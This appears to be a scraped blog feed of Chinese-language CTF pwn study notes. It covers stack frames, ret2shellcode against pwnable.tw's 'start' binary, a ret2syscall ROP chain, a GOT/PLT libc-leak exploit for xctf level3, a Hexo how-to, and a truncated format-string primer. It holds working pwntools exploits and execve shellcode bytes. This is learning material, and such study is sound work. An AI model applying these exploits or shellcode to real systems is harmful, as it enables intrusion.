title="下面我直接跳到ret处了，从这里的esp也很容易看出前面8个A是多余的所以得出第二次溢出点位104"></a>下面我直接跳到ret处了，从这里的esp也很容易看出前面8个A是多余的所以得出第二次溢出点位104</h3><pre><code>EBX: 0x0 ECX: 0xf7f9b5c0 --&gt; 0xfbad2288 EDX: 0xf7f9c89c --&gt; 0x0 ESI: 0xf7f9b000 --&gt; 0x1d4d6c EDI: 0x0 EBP: 0x41414141 (&#39;AAAA&#39;)ESP: 0xffbedef4 (&quot;AAAAAAAA\020-\340&quot;, &lt;incomplete sequence \367&gt;)EIP: 0x8048695 (&lt;main+125&gt;:    ret)EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]   0x804868a &lt;main+114&gt;:    call   0x8048440 &lt;gets@plt&gt;   0x804868f &lt;main+119&gt;:    mov    eax,0x0   0x8048694 &lt;main+124&gt;:    leave  =&gt; 0x8048695 &lt;main+125&gt;:    ret       0x8048696:    xchg   ax,ax   0x8048698:    xchg   ax,ax   0x804869a:    xchg   ax,ax   0x804869c:    xchg   ax,ax[------------------------------------stack-------------------------------------]0000| 0xffbedef4 (&quot;AAAAAAAA\020-\340&quot;, &lt;incomplete sequence \367&gt;)0004| 0xffbedef8 (&quot;AAAA\020-\340&quot;, &lt;incomplete sequence \367&gt;)0008| 0xffbedefc --&gt; 0xf7e02d10 (&lt;system&gt;:    sub    esp,0xc)0012| 0xffbedf00 --&gt; 0x0 0016| 0xffbedf04 --&gt; 0xf7f418cf (&quot;/bin/sh&quot;)0020| 0xffbedf08 --&gt; 0xf7f9b000 --&gt; 0x1d4d6c 0024| 0xffbedf0c --&gt; 0xf7fce75a (add    edi,0x178a6)0028| 0xffbedf10 --&gt; 0xf7fe6000 --&gt; 0x26f34 [------------------------------------------------------------------------------]Legend: code, data, rodata, value</code></pre><p>最终结果：</p><pre><code>[*] Switching to interactive modev\x84\x04\x86\x84\x04\x90m���Z��\xb6\x84\x04Ƅ\x04No surprise anymore, system disappeard QQ.Can you find it !?$ ls</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> wiki--pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>StackOverFlow之Ret2ShellCode详解</title>
      <link href="/2020/07/02/stackoverflow-zhi-ret2shellcode-xiang-jie/"/>
      <url>/2020/07/02/stackoverflow-zhi-ret2shellcode-xiang-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="函数调用时栈中的变化-test"><a href="#函数调用时栈中的变化-test" class="headerlink" title="函数调用时栈中的变化 test"></a>函数调用时栈中的变化 test</h1><p>示例代码:test.c</p><pre><code>#include &lt;stdio.h&gt;int fun(int a,int b){    return a + b;}int main(int argc, char const *argv[]){    int a = 1,b = 2;    fun(a,b);    return 0;}</code></pre><p><strong>编译程序： gcc test.c -m32 -fno-stack-protector -z execstack -no-pie -o test</strong><br><strong>-fno-stack-protector   ————关闭栈保护 stack</strong><br><strong>-z execstack   ————关闭NX堆栈不可执行</strong><br><strong>-no-pie   ————关闭PIE地址随机化</strong></p><p><strong>然后对test用linux自带的反汇编指令：objdump进行反汇编  objdump -d  :反汇编特定指令机器码的section  -Mintle ：表示用intel语法</strong></p><pre><code>objdump test1 -d -Mintel主要函数结果如下080483f6 &lt;fun&gt;: 80483f6:    55                       push   ebp 80483f7:    89 e5                    mov    ebp,esp 80483f9:    e8 42 00 00 00           call   8048440 &lt;__x86.get_pc_thunk.ax&gt; 80483fe:    05 02 1c 00 00           add    eax,0x1c02 8048403:    8b 55 08                 mov    edx,DWORD PTR [ebp+0x8] 8048406:    8b 45 0c                 mov    eax,DWORD PTR [ebp+0xc] 8048409:    01 d0                    add    eax,edx 804840b:    5d                       pop    ebp 804840c:    c3                       ret    0804840d &lt;main&gt;: 804840d:    55                       push   ebp 804840e:    89 e5                    mov    ebp,esp 8048410:    83 ec 10                 sub    esp,0x10 8048413:    e8 28 00 00 00           call   8048440 &lt;__x86.get_pc_thunk.ax&gt; 8048418:    05 e8 1b 00 00           add    eax,0x1be8 804841d:    c7 45 fc 01 00 00 00     mov    DWORD PTR [ebp-0x4],0x1 8048424:    c7 45 f8 02 00 00 00     mov    DWORD PTR [ebp-0x8],0x2 804842b:    ff 75 f8                 push   DWORD PTR [ebp-0x8] 804842e:    ff 75 fc                 push   DWORD PTR [ebp-0x4] 8048431:    e8 c0 ff ff ff           call   80483f6 &lt;fun&gt; 8048436:    83 c4 08                 add    esp,0x8 8048439:    b8 00 00 00 00           mov    eax,0x0 804843e:    c9                       leave   804843f:    c3                       ret    </code></pre><p> 观察fun函数可以发现：</p><pre><code>push   ebpmov   ebp,esp............pop ebpret</code></pre><p><em>这段指令标志这一个函数的开始与结束。这四句指令就是函数开辟，栈帧就是一块被ebp和esp夹住的区域的开始与结尾的标志性语句</em></p><p>现在调试看看main函数对fun函数的调用和传值在汇编中是怎样的<br>相关指令：</p><pre><code> 804841d:    c7 45 fc 01 00 00 00     mov    DWORD PTR [ebp-0x4],0x1   //将1传给 以[ebp-0x4]代表的地址处 并以32位即4字节形式传递（DWORD PTR []） a = 1 8048424:    c7 45 f8 02 00 00 00     mov    DWORD PTR [ebp-0x8],0x2   //将2传给 以[ebp-0x8]代表的地址处 并以32位即4字节形式传递（DWORD PTR []） b = 2 804842b:    ff 75 f8                 push   DWORD PTR [ebp-0x8]   //将[ebp-0x8]区域的值以32位入栈  即  b = 2 入栈 804842e:    ff 75 fc                 push   DWORD PTR [ebp-0x4]   //将[ebp-0x4]区域的值以32位入栈  即  a = 1 入栈 8048431:    e8 c0 ff ff ff           call   80483f6 &lt;fun&gt;  //调用fun函数</code></pre><p><strong>可以发现参数入栈的顺序 与我们c语言正常的调用顺序是相反的：参数逆序入栈。</strong><br><strong><em>调用一个函数前都是先压入参数(没有参数就不用)然后再调用函数汇编表现为 push xxx ; push xxx; push xxx; call xxx的形式</em></strong></p><p>继续看fun函数中对参数的调用（忽略前面两条指令）</p><pre><code>8048403:    8b 55 08                 mov    edx,DWORD PTR [ebp+0x8]  //将[ebp+0x8]区域的值传给edx 即 edx = 1 8048406:    8b 45 0c                 mov    eax,DWORD PTR [ebp+0xc]  //将[ebp+0xc]区域的值传给eax 即 eax = 2 8048409:    01 d0                    add    eax,edx  //eax = eax + edx</code></pre><p><em>为啥[ebp-0x4]  [ebp-0x8]  对应了fun函数中的 [ebp+0xc] [ebp+0x8]：</em></p><pre><code>主要影响指令main:804842b:    ff 75 f8                 push   DWORD PTR [ebp-0x8]804842e:    ff 75 fc                 push   DWORD PTR [ebp-0x4]..........fun:80483f6:    55                       push   ebp804840e:    89 e5                    mov    ebp,esp  //esp 与 ebp指向同一位置</code></pre><p>示意图<br><img src="https://s1.ax1x.com/2020/07/02/NbwCIH.png" alt=""><br>再试着去理解[ebp-0x4]  [ebp-0x8]  对应了fun函数中的 [ebp+0xc] [ebp+0x8]的原因就很明了了</p><h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p>此题源程序可以从 pwnable.tw 中获取<br>用checksec 发现保护全关</p><pre><code>[*] &#39;/home/hunter/PWN/wiki/overflow/Ret2ShellCode/start&#39;    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)</code></pre><p>因为次elf文件过于简单就没使用IDA了直接linux反汇编</p><pre><code>hunter@hunter:~/PWN/wiki/overflow/Ret2ShellCode$ objdump start -d -Mintelstart：     文件格式 elf32-i386Disassembly of section .text:08048060 &lt;_start&gt;: 8048060:    54                       push   esp 8048061:    68 9d 80 04 08           push   0x804809d  //压入exit函数地址 8048066:    31 c0                    xor    eax,eax 8048068:    31 db                    xor    ebx,ebx 804806a:    31 c9                    xor    ecx,ecx 804806c:    31 d2                    xor    edx,edx 804806e:    68 43 54 46 3a           push   0x3a465443   //压入字符串 8048073:    68 74 68 65 20           push   0x20656874 8048078:    68 61 72 74 20           push   0x20747261 804807d:    68 73 20 73 74           push   0x74732073 8048082:    68 4c 65 74 27           push   0x2774654c 8048087:    89 e1                    mov    ecx,esp 8048089:    b2 14                    mov    dl,0x14  //0x14 = 20 804808b:    b3 01                    mov    bl,0x1 804808d:    b0 04                    mov    al,0x4 804808f:    cd 80                    int    0x80   //调用write 8048091:    31 db                    xor    ebx,ebx 8048093:    b2 3c                    mov    dl,0x3c  //0x3c = 60 8048095:    b0 03                    mov    al,0x3 8048097:    cd 80                    int    0x80   //调用read 8048099:    83 c4 14                 add    esp,0x14 804809c:    c3                       ret    0804809d &lt;_exit&gt;: 804809d:    5c                       pop    esp 804809e:    31 c0                    xor    eax,eax 80480a0:    40                       inc    eax 80480a1:    cd 80                    int    0x80</code></pre><p>可以看出这整个程序就_start和_exit两个函数。看代码应该是出题者可以构造的因为按照正常的栈首先因该是 push  ebp而不是esp<br><strong>int 0x80 ; 这代表着系统中断也就是调用系统函数类似于之前所说的call xxxx; 结构不同的是这里面的参数都是寄存器传参</strong>sys_write(fd,&amp;buf,len)ebx 存放的是 fd(文件描述符有0、1、2三个值0代表标准输入1代表标准输出2代表标准错误输出)ecx 中存放的是 buf 的地址也就是将要输出的字符串的首地址edx 存放的是输出字符串的长度<br>mov  ecx,esp因为 esp 指向栈顶且根据实际程序输出ecx 就是存放着 Let’s start the CTF:</p><p>分析两次int 0x80的寄存器参数可知 ：第一次write函数将Let’s start the CTF:恰好20个字符输出。<strong>第二次read函数将读取60个字符，栈溢出。一定注意不论是调用write函数还是read函数在输出和输入字符串时esp并没有立刻改变而是等到特定的指令。</strong></p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>在调用 sys_write() 之前栈帧情况<br><img src="https://s1.ax1x.com/2020/07/02/NbwFJA.png" alt=""><br>蓝色就是buf部分执行sys_read函数时esp 还是指向此地 输入的内容重新覆盖这块缓冲区超出的部分继续向下覆盖。<br>因为ret_addr保存的是exit函数的地址正常返回的话是直接退出程序现在需要控制这个地址使其返回到我们想要去的地方。<br>在write（）后面add    esp,0x14指令将esp指向ret_addr 完成ret指令后 esp指向 原esp地址即指向的数据与地址重合。<br>那么如果我们控制ret再次跳到write函数那么esp地址会被泄露，继续下面的read函数，在read函数中我们就可以写入shellcode，控制其位置然后执行。<br><img src="https://s1.ax1x.com/2020/07/02/NbwkRI.png" alt=""></p><p>执行完sys_read()函数之后还需执行 add esp,0x14 所以 shellcode 能放的地方也只有剩下的40字节但也足够了。</p><p><img src="https://s1.ax1x.com/2020/07/02/Nbwiid.png" alt=""><br>所以 shellcode 的起始地址为 esp+20,之前的部分可任意填充除 ’\x00‘ (会造成截断)之外的内容。<br>exp：</p><pre><code>from pwn import *#context.log_level = &#39;debug&#39;sh = process(&#39;./start&#39;) #有时&#39;./start&#39;还是&quot;start&quot;或是&quot;./start&quot;也会引发玄学问题，多注意sh.recvuntil(&#39;:&#39;)payload1 = &#39;a&#39; * 20 + p32(0x08048087)#gdb.attach(sh)sh.send(payload1)   #此处如果换成sendline会出错，原因目前未知，感觉很玄学stack_addr = sh.recv(4)addr =  u32(stack_addr)nopsled = &#39;\x90&#39; * 10shellcode =&#39;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#39;payload2 = &#39;a&#39; * 20 + p32(addr + 20) + nopsled + shellcodesh.send(payload2)sh.interactive() </code></pre><p>注意：nopsled = ‘\x90’就是NULL的意思什么都不做，像滑雪橇一样一直划到 shellcode中 可以增强exp的移植性</p><p>因为NX关闭 ，这个题也可以用直接想buf中写入shellcode在用coredump寻找buf地址，转跳该地址来解决</p><p>shellcode集：<a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP链的简单构造</title>
      <link href="/2020/06/01/rop-lian-de-jian-dan-gou-zao/"/>
      <url>/2020/06/01/rop-lian-de-jian-dan-gou-zao/</url>
      
        <content type="html"><![CDATA[<h4 id="随着-NX-保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是-ROP-Return-Oriented-Programming-，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段-gadgets-来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓-gadgets-就是以-ret-结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为-ROP，是因为核心在于利用了指令集中的-ret-指令，改变了指令流的执行顺序。ROP-攻击一般得满足如下条件"><a href="#随着-NX-保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是-ROP-Return-Oriented-Programming-，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段-gadgets-来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓-gadgets-就是以-ret-结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为-ROP，是因为核心在于利用了指令集中的-ret-指令，改变了指令流的执行顺序。ROP-攻击一般得满足如下条件" class="headerlink" title="随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件"></a>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</h4><pre><code>程序存在溢出，并且可以控制返回地址。可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</code></pre><p>首先我们想想如果nx是关闭的我们可以通过构造shellcode放入栈中，再转跳的buf上即可执行我们的shellcode。而打开shell的函数是system（“/bin/sh”）或execve（“/bin/sh”）等。那么问题来了，我们这段ShellCode里面并没有system这个函数，是谁实现了“system(“/bin/sh”)”的效果呢。在网上查了一些资料大致就是：<br>EAX, EBX, ECX, EDX四个寄存器被先后清零，EAX被赋值为0Xb，ECX入栈，“/bin//sh”字符串入栈，并将其首地址赋给了EBX，最后执行完int 80h</p><p>int指令的功能是调用系统中断，所以int 80h就是调用128号中断，在32位的linux系统中，该中断被用于呼叫系统调用程序system_call( )。我们知道出于对硬件和操作系统内核的保护，应用程序的代码一般在保护模式下运行。<br>在这个模式下我们使用的程序和写的代码是没办法访问内核空间的。但是我们显然可以通过调用read( ), write( )之类的函数从键盘读取输入，把其保存在硬盘里的文件中。那么read( ), write( )之类的函数是怎么突破保护模式的管制，成功访问到本该由内核管理的这些硬件呢？<br>答案就在于int 80h这个中断调用。不同的内核态操作通过给寄存器设置不同的值，再调用同样的指令int 80h，就可以通知内核完成不同的功能。而read( ), write( ), system( )之类的需要内核“帮忙”的函数，就是围绕这条指令加上一些额外参数处理，异常处理等代码封装而成的。32位linux系统的内核一共提供了0~337号共计338种系统调用用以实现不同的功能。<br>Linux 32位的系统调用时通过int 80h来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数。<br>以下是一个简单的hello world程序</p><pre><code>.section .datamsg:        .ascii &quot;Hello world!\n&quot;.section .text.globl _start_start:        movl $4, %eax        movl $1, %ebx        movl $msg, %ecx        movl $13, %edx        int $0x80        movl $1, %eax        movl $0, %ebx        int $0x80</code></pre><h3 id="从-usr-include-asm-unistd-h中可以看到exit的功能号-NR-exit为1，write-NR-write-功能号为4，因此第一个int-0x80调用之前eax寄存器值为4，ebx为文件描述符，stdout的文件描述符为1，ecx则为buffer的内存地址，edx为buffer长度。第二个int-0x80之前eax为1表示调用exit，ebx为0表示返回0。"><a href="#从-usr-include-asm-unistd-h中可以看到exit的功能号-NR-exit为1，write-NR-write-功能号为4，因此第一个int-0x80调用之前eax寄存器值为4，ebx为文件描述符，stdout的文件描述符为1，ecx则为buffer的内存地址，edx为buffer长度。第二个int-0x80之前eax为1表示调用exit，ebx为0表示返回0。" class="headerlink" title="从 /usr/include/asm/unistd.h中可以看到exit的功能号_NR_exit为1，write(_NR_write)功能号为4，因此第一个int 0x80调用之前eax寄存器值为4，ebx为文件描述符，stdout的文件描述符为1，ecx则为buffer的内存地址，edx为buffer长度。第二个int 0x80之前eax为1表示调用exit，ebx为0表示返回0。"></a>从 /usr/include/asm/unistd.h中可以看到exit的功能号_NR_exit为1，write(_NR_write)功能号为4，因此第一个int 0x80调用之前eax寄存器值为4，ebx为文件描述符，stdout的文件描述符为1，ecx则为buffer的内存地址，edx为buffer长度。第二个int 0x80之前eax为1表示调用exit，ebx为0表示返回0。</h3><h2 id="我们常用的："><a href="#我们常用的：" class="headerlink" title="我们常用的："></a>我们常用的：</h2><pre><code>1. sys_exitSyntax: int sys_exit(int status)Source: kernel/exit.cAction: terminate the current processDetails: status is return code3. sys_readSyntax: ssize_t sys_read(unsigned int fd, char * buf, size_t count)Source: fs/read_write.cAction: read from a file descriptorDetails:4. sys_writeSyntax: ssize_t sys_write(unsigned int fd, const char * buf, size_t count)Source: fs/read_write.cAction: write to a file descriptorDetails:11. sys_execveSyntax: int sys_execve(struct pt_regs regs)Source: arch/i386/kernel/process.cAction: execute programDetails:</code></pre><p><img src="https://s1.ax1x.com/2020/06/01/t3TOts.png" alt=""></p><p>很容易发现ShellCode中的EAX = 0Xb = 11，EBX = &amp;(“/bin//sh”), ECX = EDX = 0，即执行了sys_execve(“/bin//sh”, 0, 0, 0)，通过/bin/sh软链接打开一个shell，所以我们可以在没有system函数的情况下打开shell。</p><h3 id="简单地说，只要我们把对应获取-shell-的系统调用的参数放到对应的寄存器中，那么我们在执行-int-0x80-就可执行对应的系统调用。"><a href="#简单地说，只要我们把对应获取-shell-的系统调用的参数放到对应的寄存器中，那么我们在执行-int-0x80-就可执行对应的系统调用。" class="headerlink" title="简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。"></a>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。</h3><p>比如我们像得到shell可以执行这个函数：execve(“/bin/sh”,NULL,NULL)<br>那么：其中，该程序是 32 位，所以我们需要使得</p><pre><code>系统调用号，即 eax 应该为 0xb第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。第二个参数，即 ecx 应该为 0第三个参数，即 edx 应该为 0</code></pre><p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p><pre><code>ROPgadget --binary rop  --only &#39;pop|ret&#39; | grep &#39;eax&#39;  //搜寻pop eax 和retROPgadget --binary rop  --only &#39;pop|ret&#39; | grep &#39;ebx&#39;  //搜寻pop ebx 和retROPgadget --binary rop  --string &#39;/bin/sh&#39;   //还可以找字符串，那当然也可以找system函数如果有的话ROPgadget --binary rop  --only &#39;int&#39;   //这个主要找 int 80h这个指令</code></pre><p>找到完地址后：<br><img src="https://s1.ax1x.com/2020/06/01/t3TzcV.png" alt=""><br>根据以上思路把payload像上面这样构造就好了<br>实战：ret2syscall这个例子<br>32位程序<br><img src="https://s1.ax1x.com/2020/06/01/t3TXhn.png" alt=""><br>IDA：</p><pre><code>int __cdecl main(int argc, const char **argv, const char **envp){  int v4; // [sp+1Ch] [bp-64h]@1  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  puts(&quot;This time, no system() and NO SHELLCODE!!!&quot;);  puts(&quot;What do you plan to do?&quot;);  gets(&amp;v4);  return 0;}</code></pre><p>溢出点就没搞步骤了：112个字符，既然没有system还开启了NX    那就用rop吧<br>因为没有system函数，那么我们就得构造execve的ROP链：<br>找pop eax ；ret 指令<br><img src="https://s1.ax1x.com/2020/06/01/t3Tvpq.png" alt=""><br>我们选第二个</p><p>找pop ebx；ret指令<br><img src="https://s1.ax1x.com/2020/06/01/t37CBF.png" alt=""><br>这里我们选倒数第5个：</p><pre><code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret //这个直接把另外两个包括了，我们构造的时候注意参数位置即可</code></pre><p>找int 80h指令<br><img src="https://s1.ax1x.com/2020/06/01/t379nU.png" alt=""></p><p>还有/bin/sh字符串<br><img src="https://s1.ax1x.com/2020/06/01/t37SXT.png" alt=""></p><p>万事具备！！<br>构造exp：</p><pre><code>from pwn import*#0x080bb196 : pop eax ; retpop_eax_ret = 0x080bb196#0x080be408 : /bin/shbinsh_addr = 0x080be408#0x08049421 : int 0x80#0x0806eb90 : pop edx ; pop ecx ; pop ebx ; retpop_edx_pop_ecx_pop_ebx_ret = 0x0806eb90payload = &quot;A&quot;*112 + p32(pop_eax_ret) + p32(0xb) + p32(pop_edx_pop_ecx_pop_ebx_ret) + p32(0) + p32(0) + p32(binsh_addr)  + p32(0x08049421)sh = process(&quot;ret2syscall&quot;)sh.sendline(payload)sh.interactive()</code></pre><p><img src="https://s1.ax1x.com/2020/06/01/t3Tx10.png" alt=""></p><p>（系统调用功能好可以参考System Call Number Definition<br>以及<a href="http://asm.sourceforge.net/syscall.html#2" target="_blank" rel="noopener">http://asm.sourceforge.net/syscall.html#2</a><br>或者 <a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">http://syscalls.kernelgrok.com/</a> 查找(推荐!)</p><p>启发：<a href="https://zhuanlan.zhihu.com/p/72951960（详细）" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/72951960（详细）</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mass</title>
      <link href="/2020/05/23/mass/"/>
      <url>/2020/05/23/mass/</url>
      
        <content type="html"><![CDATA[<pre><code>             hexo基本写文章操作：</code></pre><p>1：在自己本地blog文件夹git bash here<br><img src="https://s1.ax1x.com/2020/05/23/YjltX9.png" alt=""></p><p>2:在bash中：hexo n “name” 或是直接在_posts中写文章</p><p>3：文章中插入图片<br>    语法：</p><p>![图片alt](图片地址 ‘’图片title’’)</p><p>图片alt就是显示在图片下面的文字，相当于对图片内容的解释。<br>图片title是图片的标题，当鼠标移到图片上时显示的内容。title可加可不加</p><p>4：图床：<a href="https://imgchr.com/matri_x" target="_blank" rel="noopener">https://imgchr.com/matri_x</a></p><p>5：hexo g //生成静态网页，用于测试<br>    hexo s  //打开本地服务器，结合用于测试<br>    hexo d  //上传到github发布</p>]]></content>
      
      
      
        <tags>
            
            <tag> mass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析got，plt，libc</title>
      <link href="/2020/05/23/qian-xi-got-plt-libc/"/>
      <url>/2020/05/23/qian-xi-got-plt-libc/</url>
      
        <content type="html"><![CDATA[<p>见详解：<a href="https://blog.csdn.net/weixin_41185953/article/details/104224260" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41185953/article/details/104224260</a></p><p>在引用一个函数时（如call printf）先会条到该函数的plt表：@plt。然后plt表上存有对应该函数的got表地址，跳到got表上。这个表上面存放被引用函数的真实地址。<br>为了程序运行时的效率，还没有引用某个函数时程序不会连接启用包括此函数这样就使程序运行速度更快。</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj19c4.png" alt="picture1"></p><p>libc文件里面包含大量函数包括system，read，write还有字符串/bin/sh ，libc在被程序引用时会分配到一个地址也就是libc的首地址，然后里面的函数或被程序引用。</p><p>引用过程：<br>首先libc分配到一个地址，他里面的函数字符串什么的本来就有内部基于libc首地址的偏移量，这些偏移量都是可以用ELF指令解析libc文件再用搜寻指令查到。所以一旦libc被引用分配得首地址libc里面所包括的所有函数和字符串地址就都确定了。call函数时用上述的plt，got表跳转寻址，最后通过重定位got表得到真实函数地址。</p><p>对应题目：xctf pwn level3<br>1:file</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1m9O.png" alt="picture2"></p><p>2:checksec</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1VN6.png" alt="picture3"></p><p>可以栈溢出，NX开启：rop绕过</p><p>3：ida</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1kH1.png" alt="picture4"></p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1EAx.png" alt="picture5"></p><p>查看buf的栈空间发现可以溢出：溢出量140</p><p>所以现在的思路就是：payload = “A”*140 + p32(system_addr) + p32(0) + p32(binsh_addr)<br>所以得有哦system函数和binsh字符串   注意此处system函数的构建：函数地址+返回地址+函数参数  很多情况都是在栈中这样构建函数</p><p>4：ida查看函数与字符串</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1FBR.png" alt="picture6"></p><p>显然这个程序只调用了read和write函数，没有system和binsh。恰好libc里面这两个都有所以要想办法得到libc的基地址。</p><p>这里write函数有三个参数：1，字符串（地址），显示的字节数</p><p>如果我们溢出了read函数后跳到我们自己构建的write函数上，把中间的参数改为write的got地址那么显示出got表上存放write函数的真实<br>地址（plt存储got表地址，got表存放函数地址）。<br>如果我们得到了write函数的真实地址，然后可以轻松得到write函数在libc中的偏移量，最后算出libc的基地址：libc_addr = write_addr - write_offset<br>得到了libc的基地址那么我们就可以得到system和binsh的真实地址，然后再进行一次溢出攻击即可</p><p>exp：<br>from pwn import*</p><p>sh = remote(“124.126.19.106”,52825)</p><p>#sh = process(“level3”)</p><p>elf = ELF(“level3”)<br>libc = ELF(“libc_32.so.6”)</p><p>write_plt = elf.symbols[‘write’]    #write函数的plt地址<br>write_got = elf.got[‘write’]  #write函数的got地址，该地址存放write真实地址<br>main_addr = 0x08048484 #main函数地址可以从ida直接看，也可以elf.symbols[‘main’]搜索</p><p>#print write_plt<br>#print write_got<br>#print main_addr</p><p>payload = “A”*140 + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) #第一次攻击溢出后返回到write函数的plt地址，因为write函数早已调用可以用plt地址或got地址来再次调用。后面时返回地址，返回到主函数将再次执行vulnerable函数以备下一次攻击。p32（1）为write函数的第一个参数，接下来分别是第二个第三个参数。p32（write_got）将go地址发给write作为参数，write将读取该地址上的内容并以字符串输出，p32(4)输出4字节</p><p>#p.recv()<br>sh.recv() </p><p>sh.sendline(payload)</p><p>write_addr = u32(sh.recv(4))  #sh.recv(4)是接受4个字节的输出，u32和p32功能相反</p><p>#print write_addr</p><p>libc_addr = write_addr - libc.symbols[‘write’] #减去了write的offset</p><p>#print(hex(libc_addr))</p><p>#print “libc”+hex(libc_addr)</p><p>binsh_addr = libc_addr + libc.search(“/bin/sh”).next()  #得到binsh真实地址</p><p>#print “binsh_addr =&gt; “+hex(binsh_addr)</p><p>sys_addr = libc_addr + libc.symbols[‘system’]  #得到system真实地址</p><p>print “sys_addr =&gt; “+hex(sys_addr)</p><p>payload = “A”*140 + p32(sys_addr) + p32(0) + p32(binsh_addr)  #通过上次攻击返回地址位vulnerable函数可以再次攻击</p><p>sh.recv()</p><p>sh.sendline(payload)</p><p>sh.interactive()</p><p>注意在本地测试脚本时要找到本地level3引用的libc文件：指令ldd level3</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1Z4K.png" alt="picture7"></p><p>因为本地的libc文件和题目给的有点不一样，至少offset是不一样的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Format String Exploit</title>
      <link href="/2020/05/22/formal/"/>
      <url>/2020/05/22/formal/</url>
      
        <content type="html"><![CDATA[<pre><code>                   格式化字符串漏洞原理</code></pre><p>格式化字符串函数是根据格式化字符串函数来进行解析的。那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制。比如说’%s’表明我们会输出一个字符串参数。</p><p><img src="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/figure/printf.png" alt="函数"></p><p>对于这样的例子，在进入 printf 函数的之前 (即还没有调用 printf)，栈上的布局由高地址到低地址依次如下<br>some value   //未知量<br> 3.14 123456<br> addr of “red”<br> addr of format string: Color %s…</p><p>在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况<br>当前字符不是 %，直接输出到相应标准输出。<br>当前字符是 %， 继续读取下一个字符<br>如果没有字符，报错<br>如果下一个字符是 %, 输出 %<br>否则根据相应的字符，获取相应的参数，对其进行解析并输出</p><p>假设编写如下程序:<br>printf(“Color %s, Number %d, Float %4.2f”);<br>程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为<br>1.解析其地址对应的字符串<br>2.解析其内容对应的整形值<br>3.解析其内容对应的浮点值</p><p>#以上来源于<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr" target="_blank" 